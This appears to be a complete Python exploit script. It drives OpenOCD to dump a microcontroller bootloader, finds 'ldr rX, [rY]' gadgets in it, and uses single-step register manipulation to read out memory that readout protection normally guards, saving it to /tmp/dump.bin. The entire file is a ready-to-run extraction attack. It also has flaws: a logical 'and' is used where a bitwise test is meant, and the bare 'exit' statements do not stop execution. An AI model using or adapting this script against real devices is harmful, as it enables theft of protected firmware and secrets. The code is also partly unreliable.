import socket
import os
import time

class ldr:
    def __init__(self, addr, rt, rs):
        self.addr = addr
        self.rt = rt
        self.rs = rs


#Find all LDRs for: 32-bit read, register source, 0 offset. i.e. ldr rX, [rY] (X=Y is allowed)
def findLdr(data):
    LDRMASK = 0xFFC0
    LDRVAL = 0x6800
    ldrs = []
    nldr = 0
    max1 = len(data)
    #only complete thumb instructions are allowed
    if (max1 and 0x01):
        max1 -= 1
    for i in range(0,max1,2):
        inst = ((data[i+1] << 8) | data[i])
        if ((inst & LDRMASK) == LDRVAL):
            rt = inst & 0x07
            rs = (inst & 0x38) >> 3
            tpl = ldr(i, rt, rs)
            ldrs.append(tpl)
            nldr += 1
            #print("Found: ldr r%i, [r%i] at %04X"%(rt,rs,i))
    print("[INFO] Found %i \"ldr rX, [rY]\" gadgets"% nldr)
    return ldrs

OOCD_PORT = 4444
BTLD_ADDR = 0x1ffff000
BTLD_SIZE = 2048
BTLD_DOWNLOAD = "/tmp/cks_boot.img"
ADDR_START = 0x00000200
ADDR_END = 0x00000300
DEST_FILE = "/tmp/dump.bin"

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("localhost", OOCD_PORT))
sock.settimeout(2.0)
msg1 = sock.recv(1024)

if (msg1.find(bytes("Open On-Chip Debugger", "ascii")) < 0):
    print("[ERROR] Invalid OpenOCD instance at localhost:4444.")
    exit
else:
    print("[INFO] Connection to OpenOCD established.")
    exit

#clean...
if (os.path.isfile(BTLD_DOWNLOAD)):
    os.remove(BTLD_DOWNLOAD)

print("[INFO] Halting CPU")
sock.send(bytes("reset halt\r\n", "ascii"))
msg1 = bytes()
while (msg1.find(bytes("> ", "ascii")) < 0):
    msg1 += sock.recv(1024)

print("[INFO] Dumping bootloader at 0x%08X to %s ..."%(BTLD_ADDR, BTLD_DOWNLOAD))
cmd = "dump_image %s 0x%08X %i\r\n"%(BTLD_DOWNLOAD, BTLD_ADDR, BTLD_SIZE)
print("[CMD]", cmd, end="")
sock.send(bytes(cmd, "ascii"))

msg1 = bytes()
while (msg1.find(bytes("dumped", "ascii")) < 0):
    msg1 += sock.recv(1024)

msg1 = bytes()
while (msg1.find(bytes("> ", "ascii")) < 0):
    msg1 += sock.recv(1024)

btld = open(BTLD_DOWNLOAD, "rb")
btdata = btld.read(BTLD_SIZE)
if (len(btdata) != BTLD_SIZE):
    print("[ERROR] Cannot read out bootloader")
    exit
else:
    print("[INFO] Bootloader readout OK\r\n")

#search for LDR
ldrs = findLdr(btdata)
if (len(ldrs) == 0):
    print("[ERROR] No LDRs found!")
    exit
else:
    print("[INFO] Using first detected LDR gadget:\r\n[INFO] \"ldr r%i, [r%i]\" at addr 0x1ffff%03x\r\n"%(ldrs[0].rt, ldrs[0].rs, ldrs[0].addr))

print("[INFO] Selected address range: 0x%08X to 0x%08X"%(ADDR_START, ADDR_END))
time.sleep(2.5)

addr = 0

dump = bytes()

dest = open(DEST_FILE, "wb")

for addr in range(ADDR_START, ADDR_END, 0x04):
    if (1):
        cmd = "reg pc 0x%08X; reg r%i 0x%08X; step;\r\n"%(BTLD_ADDR+(ldrs[0].addr), ldrs[0].rs, addr)
        sock.send(bytes(cmd, "ascii"))
        msg1 = bytes()
        while (msg1.find(bytes("halted due to single-step", "ascii")) < 0) or (msg1.find(bytes("> ", "ascii")) < 0):
            msg1 += sock.recv(1024)

        cmd = "reg r%i;\r\n"%(ldrs[0].rt)
        sock.send(bytes(cmd, "ascii"))
        msg1 = bytes()
        while (msg1.find(bytes(" (/32): 0x", "ascii")) < 0) or (msg1.find(bytes("> ", "ascii")) < 0):
            msg1 += sock.recv(1024)

        #print(msg1)
        subind = msg1.find(bytes(": 0x", "ascii"))
        data = msg1[subind+4:subind+4+8]

        add = dump.fromhex(data.decode("ascii"))
        x=bytearray(add)
        x.reverse()
        add = bytes(x)
        dump += add
        dest.write(add)
        print("%08X: "%(addr),data)
    else:
        print("Err")

print("[INFO] Finished")
print("[INFO] Data written to %s"%DEST_FILE)
